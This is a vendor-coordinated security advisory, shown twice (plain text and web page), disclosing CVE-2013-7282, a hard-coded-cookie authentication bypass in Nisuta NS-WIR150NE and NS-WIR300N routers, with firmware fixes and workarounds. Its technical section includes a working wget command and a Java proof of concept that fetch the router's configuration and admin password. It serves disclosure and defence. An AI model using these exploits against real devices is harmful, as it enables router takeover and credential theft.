=== Content from www.ampliasecurity.com_dd13e0ed_20250124_223034.html ===
Nisuta NS-WIR150NE, NS-WIR300N Wireless Routers Remote Management Web Interface Authentication Bypass Vulnerability
Amplia Security - Amplia Security Research Advisory (AMPLIA-ARA050913)
Advisory ID: AMPLIA-ARA050913
Advisory URL: https://www.ampliasecurity.com/advisories/AMPLIA-ARA050913.txt, https://www.ampliasecurity.com/advisories/nisuta-nswir150ne-nswir300n-wireless-router-remote-management-web-interface-authentication-bypass-vulnerability.html
Date Published: 12-26-2013
Vendors Contacted: Nisuta (www.nisuta.com)
Release Mode: Coordinated Release
Last Updated: 04-21-2014
Index
-----
1. Vulnerability Information
2. Vulnerability Description
3. Vulnerable Systems
4. Vendor Information, solutions and workarounds
5. Credits
6. Technical Description
7. Disclaimer
1.Vulnerability Information
---------------------------
Impact: Remote attackers can bypass authentication and access the router's management web interface obtaining complete control of the device
Remotely Exploitable: Yes
Bugtraid Id:
CVE: CVE-2013-7282
2.Vulnerability Description
----------------------------
The Nisuta (www.nisuta.com) NS-WIR150NE and NS-WIR300N wireless routers provide a remote management web interface available both on the WAN (not enabled by default) and LAN interfaces (enabled by default).
This remote management web interface requires a password.
A remote attacker can bypass authentication and gain access to the remote management web interface, taking control of the device, without knowing the password.
3.Vulnerable Systems
--------------------
Nisuta NS-WIR150NE wireless router, firmware v5.07.41
Nisuta NS-WIR300N wireless router, firmware v5.07.36\_NIS01 (hardware version v3.0)
and probably other Nisuta wireless routers with similar firmware.
4.Vendor Information, Solutions and Workarounds
-----------------------------------------------
The vendor made available the following firmware updates:
Nisuta NS-WIR150NE
https://www.nisuta.com/producto.asp?id=NSWIR150NE
https://www.nisuta.com/drivers/NSWIR150NE.rar
Nisuta NS-WIR150NF
https://www.nisuta.com/producto.asp?id=NSWIR150NF
https://www.nisuta.com/drivers/NSWIR150NF.rar
Nisuta NS-WIR300N
https://www.nisuta.com/firmware/NSWIR300N.rar
Nisuta NS-WIR300ND
https://www.nisuta.com/firmware/NSWIR300ND.rar
The fix implemented by the vendor is not optimal, although better than any workaround.
As a workaround, disable remote management on the WAN interface (not enabled by default). However, it is not possible to disable remote management on the LAN interface, and
applying the fix is recommended.
It is possible to restrict remote management on the WAN interface based on source IP address, but given the critical nature of this vulnerability we do not recommend it as a workaround.
It is also worth mentioning that the remote management web interface works over http without encryption, even with the flaw described in this advisory fixed, the interface is still insecure for other reasons.
5.Credits
---------
This vulnerability was discovered by Amplia Security Research.
We thank Nisuta for their efforts to try to fix this vulnerability and improve the security of their products.
6. Technical Description
------------------------
The Nisuta NS-WIR150NE and NS-WIR300N wireless routers provide a remote management web interface available both on the WAN (not enabled by default) and LAN interfaces (enabled by default).
This remote management web interface requires a password and uses form-based authentication (performed over http without encryption, which is another issue).
After entering the correct password, the router's remote management web interface always sets the same cookie, shown next:
Set-Cookie: admin:language=en; path=/
This cookie is hard-coded and obviously insecure.
Using this cookie in a HTTP request is enough to "bypass authentication" and login to the remote management web interface as an administrator without knowing the password.
The 'admin' value is not even required. For example,
Cookie: :language=en; path=/
is enough to gain access to the router.
PoC Exploit:
An unauthenticated remote attacker on the WAN and LAN interfaces can perform any action available on the router's remote management web interface, as an example, the following command will bypass authentication and download the router's configuration which includes the current remote management web interface password among other confidential information:
$ wget --header="Cookie: :language=en" http://192.168.2.1/cgi-bin/DownloadCfg/config.cfg -t 1
The password is in the 'http\_passwd' variable:
$ grep http\_passwd config.cfg
http\_passwd=mysecretpassword
$
The attacker can now conveniently login into the remote management web interface with full control and perform changes, obtain information, etc.
Again, the password is not needed, the attacker can just set the cookie 'admin:language=en' in his browser to gain access to the management interface or perform other actions directly, this is just an example.
Custom implementation of the PoC exploit:
// Nisuta NS-WIR150NE, NS-WIR300N Wireless Routers Remote Management Web Interface Authentication Bypass Vulnerability
// Amplia Security - Amplia Security Research Advisory (AMPLIA-ARA050913)
// PoC exploit - dumps the router's configuration files which includes the management interface password
// and other information
// compile: javac poc.java
// run: java poc > router.cfg
import java.net.URL;
import java.net.URLConnection;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
public class poc {
public static void main(String[] args)
{
try {
URL url = new URL("http://192.168.2.1/cgi-bin/DownloadCfg/config.cfg");
URLConnection conn = url.openConnection();
conn.setRequestProperty("Cookie", ":language=en");
BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
String line;
while ((line = rd.readLine()) != null) {
System.out.println(line);
}
} catch(Exception e) {
e.printStackTrace();
}
}
};
7.Disclaimer
------------
The contents of this advisory are copyright (c) 2013 Amplia Security (www.ampliasecurity.com), and
may be distributed freely provided that no fee is charged for distribution and proper credit is given.


=== Content from www.ampliasecurity.com_f48f5ea3_20250124_223034.html ===


Toggle navigation

![Amplia Security](/assets/images/logo-amplia_security.png)

* [HOME](/index.html)
* [SERVICES](/services.html)
  + [Web Application Penetration Testing](/services/web-application-penetration-test.html)
  + [Network Penetration Testing](/services/network-penetration-test.html)
  + [Client-Side Penetration Testing](/services/client-side-penetration-test.html)
  + [Wireless Penetration Testing](/services.html)
  + [Software Penetration Testing](/services.html)
  + [Appliance Penetration Testing](/services.html)
  + [Web Service Penetration Testing](/services.html)
  + [Software Security Assessments](/services.html)
  + [Source Code Review](/services.html)
* [RESEARCH](/research.html)
* [ABOUT US](/aboutus.html)
* [CONTACT](/contact.html)
* [BLOG](/blog)
* [NEWS](/newsandevents.html)

![background](/assets/images/background.png)

### Nisuta NS-WIR150NE, NS-WIR300N Wireless Routers Remote Management Web Interface Authentication Bypass Vulnerability

**Security Advisory Title**: Nisuta NS-WIR150NE, NS-WIR300N Wireless Routers Remote Management Web Interface Authentication Bypass Vulnerability
**Advisory ID**: AMPLIA-ARA050913

**Date published**: 12-26-2013
**Vendors contacted**: Nisuta (www.nisuta.com)
**Release mode**: Coordinated release
**Last Updated**: 04-21-2014

### Index

**1.** Vulnerablity information

**2.** Vulnerablity description

**3.** Vulnerable systems

**4.** Vendor Information, solutions and workarounds

**5.** Credits

**6.** Technical description

**7.** Disclaimer

### 1. Vulnerability information

**Impact**: Remote attackers can bypass authentication and access the router's management web interface obtaining complete control of the device

**Remotely Exploitable**: Yes

**Bugtraq Id**: <unknown>

**CVE**: CVE-2013-7282

### 2. Vulnerability description

The Nisuta (www.nisuta.com) NS-WIR150NE and NS-WIR300N wireless routers provide a remote management web interface available both on the WAN (not enabled by default) and LAN interfaces (enabled by default).

This remote management web interface requires a password.

A remote attacker can bypass authentication and gain access to the remote management web interface, taking control of the device, without knowing the password.

### 3. Vulnerable Systems

Nisuta NS-WIR150NE wireless router, firmware v5.07.41

Nisuta NS-WIR300N wireless router, firmware v5.07.36\_NIS01 (hardware version v3.0)

and probably other Nisuta wireless routers with similar firmware.

### 4. Vendor Information, Solutions and Workarounds

The vendor made available the following firmware updates:

Nisuta NS-WIR150NE

<https://www.nisuta.com/producto.asp?id=NSWIR150NE>

<https://www.nisuta.com/drivers/NSWIR150NE.rar>

Nisuta NS-WIR150NF

<https://www.nisuta.com/producto.asp?id=NSWIR150NF>

<https://www.nisuta.com/drivers/NSWIR150NF.rar>

Nisuta NS-WIR300N

<https://www.nisuta.com/firmware/NSWIR300N.rar>

Nisuta NS-WIR300ND

<https://www.nisuta.com/firmware/NSWIR300ND.rar>

The fix implemented by the vendor is not optimal, although better than any workaround.

As a workaround, disable remote management on the WAN interface (not enabled by default). However, it is not possible to disable remote management on the LAN interface, and applying the fix is recommended.

It is possible to restrict remote management on the WAN interface based on source IP address, but given the critical nature of this vulnerability we do not recommend it as a workaround.

It is also worth mentioning that the remote management web interface works over http without encryption, even with the flaw described in this advisory fixed, the interface is still insecure for other reasons.

### 5. Credits

This vulnerability was discovered by Amplia Security Research.

We thank Nisuta for their efforts to try to fix this vulnerability and improve the security of their products.

### 6. Technical description

The Nisuta NS-WIR150NE and NS-WIR300N wireless routers provide a remote management web interface available both on the WAN (not enabled by default) and LAN interfaces (enabled by default).

This remote management web interface requires a password and uses form-based authentication (performed over http without encryption, which is another issue).

After entering the correct password, the router's remote management web interface always sets the same cookie, shown next:

Set-Cookie: admin:language=en; path=/

This cookie is hard-coded and obviously insecure.

Using this cookie in a HTTP request is enough to "bypass authentication" and login to the remote management web interface as an administrator without knowing the password.

The 'admin' value is not even required. For example,

Cookie: :language=en; path=/

is enough to gain access to the router.

PoC Exploit:

An unauthenticated remote attacker on the WAN and LAN interfaces can perform any action available on the router's remote management web interface, as an example, the following command will bypass authentication and download the router's configuration which includes the current remote management web interface password among other confidential information:

$ wget --header="Cookie: :language=en" http://192.168.2.1/cgi-bin/DownloadCfg/config.cfg -t 1

The password is in the 'http\_passwd' variable:

$ grep http\_passwd config.cfg

http\_passwd=mysecretpassword

$

The attacker can now conveniently login into the remote management web interface with full control and perform changes, obtain information, etc.

Again, the password is not needed, the attacker can just set the cookie 'admin:language=en' in his browser to gain access to the management interface or perform other actions directly, this is just an example.

Custom implementation of the PoC exploit:

// Nisuta NS-WIR150NE, NS-WIR300N Wireless Routers Remote Management Web Interface Authentication Bypass Vulnerability
// Amplia Security - Amplia Security Research Advisory (AMPLIA-ARA050913)
// PoC exploit - dumps the router's configuration files which includes the management interface password
// and other information
// compile: javac poc.java
// run: java poc > router.cfg
import java.net.URL;
import java.net.URLConnection;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
public class poc {
public static void main(String[] args)
{
try {
URL url = new URL("http://192.168.2.1/cgi-bin/DownloadCfg/config.cfg");
URLConnection conn = url.openConnection();
conn.setRequestProperty("Cookie", ":language=en");
BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
String line;
while ((line = rd.readLine()) != null) {
System.out.println(line);
}
} catch(Exception e) {
e.printStackTrace();
}
}
};

### 7. Disclaimer

The contents of this advisory are copyright (c) 2013 Amplia Security (www.ampliasecurity.com), and
may be distributed freely provided that no fee is charged for distribution and proper credit is given.

### SERVICES

* [Web Application Penetration Testing](/services/web-application-penetration-test.html)
* [Network Penetration Testing](/services/network-penetration-test.html)
* [Client-Side Penetration Testing](/services/client-side-penetration-test.html)
* [Wireless Penetration Testing](/services.html)
* [Software Penetration Testing](/services.html)
* [Appliance Penetration Testing](/services.html)
* [Web Service Penetration Testing](/services.html)
* [Software Security Assessments](/services.html)
* [Source Code Reviews](/services.html)

### MOST DOWNLOADED

* [WCE v1.41beta (Universal)](https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip)
* [WCE v1.42beta 64bit](https://www.ampliasecurity.com/research/wce_v1_42beta_x64.zip)
* [WCE v1.42beta 32bit](https://www.ampliasecurity.com/research/wce_v1_42beta_x32.zip)
* [Post-Exploitation with WCE](https://www.ampliasecurity.com/research/wce12_uba_ampliasecurity_eng.pdf)
* [ASP.NET Padding oracle Attack POC exploit (MS10-070)](https://www.ampliasecurity.com/research/aspx_po_chotext_attack.rb)
* [ASP.NET Auto-Decryptor File Download PoC Exploit (MS10-070)](https://www.ampliasecurity.com/research/aspx_ad_chotext_attack.rb)

### MOST READ

* [WCE F.A.Q.](https://www.ampliasecurity.com/research/wcefaq.html)
* [Exploiting BASH Remote Code Execution Vulnerability (CVE-2014-6271)](https://www.ampliasecurity.com/blog/2014/09/24/exploiting_bash_remote_code_execution_vulnerability_CVE-2014-6271/)
* [Java 7 Update 10 0-Day Vulnerability (CVE-2013-0422)](https://www.ampliasecurity.com/blog/2013/01/10/java_7_update_10_0-day_vulnerability_CVE-2013-0422/)
* [A Padding Oracle Attack Implemented in Javascript](https://www.ampliasecurity.com/blog/2010/09/28/a_padding_oracle_attack_implemented_in_javascript/)

### MOST WATCHED

* [Exploiting BASH Remote Code Execution Vulnerability (CVE-2014-6271)](https://www.youtube.com/watch?v=PLnvKsYJwiM)
* [Exploiting MySQL Authentication Bypass Vulnerability (CVE-2012-2122)](https://youtu.be/Mg5iUjOpusE?hd=1)
* [Exploiting Apache Struts ExceptionDelegator Vulnerability (CVE-2012-0391)](https://youtu.be/YGCSJEZ7kPk?hd=1)
* [ASP.NET Padding Oracle attack PoC exploit video](https://www.youtube.com/ampliasecurity#p/u/0/2jvmT5lmIIM)
* [Using GTT to download files from an isolated Citrix environment](https://www.youtube.com/ampliasecurity#p/u/1/asRpCcVhnuI)

Â© Copyright 2018 by Amplia Security. All Rights Reserved


